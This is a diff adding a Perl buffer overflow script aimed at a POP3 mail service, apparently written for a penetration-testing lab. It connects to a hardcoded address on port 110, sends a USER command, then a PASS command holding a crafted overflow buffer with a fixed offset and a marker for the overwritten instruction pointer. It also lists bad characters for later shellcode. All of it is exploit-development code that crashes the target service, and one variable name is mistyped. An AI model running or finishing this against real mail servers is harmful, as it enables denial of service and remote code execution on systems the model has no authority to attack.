@@ -1,0 +1,48 @@
+#!/usr/bin/perl
+
+use IO::Socket::INET;
+
+
+my $bad = "\x00\x0a\x0d";
+# 5F4A358F
+my $step = 100;
+my $count = $step;
+my $buffer = "A" x 2606 . "B" x 4 . "C" x (3500-2606-4);
+
+my $replies = {};
+
+while(1) {
+    my $s = IO::Socket::INET->new(
+        PeerHost => $ARGV[1] || "10.11.25.184",
+        PeerPort => $ARGV[2] || 110,
+        Proto => $ARGV[3] || 'tcp',
+    ) or die $!;
+
+    my $res = <$s>; # discard the welcome / at least for now
+    print $res,"\n";
+
+    print "Sending: USER username\n";
+    print $s "USER username\r\n";
+    $res = <$s>;
+    print $res,"\n";
+    #my $buffer = "A" x 2700;
+    #my $buffer = $buffer x $count;
+    print "[+] Sending count: $count\n";
+    $count += $step;
+    print "Sending: PASS $buffer\r\n";
+    print $s "PASS $buffer\r\n";
+    chomp($res = <$s>);
+    print $res,"\n";
+    $resplies->{$res}++;
+
+    close $s;
+
+    sleep 1;
+    exit;
+
+}
+
+
+
+
+
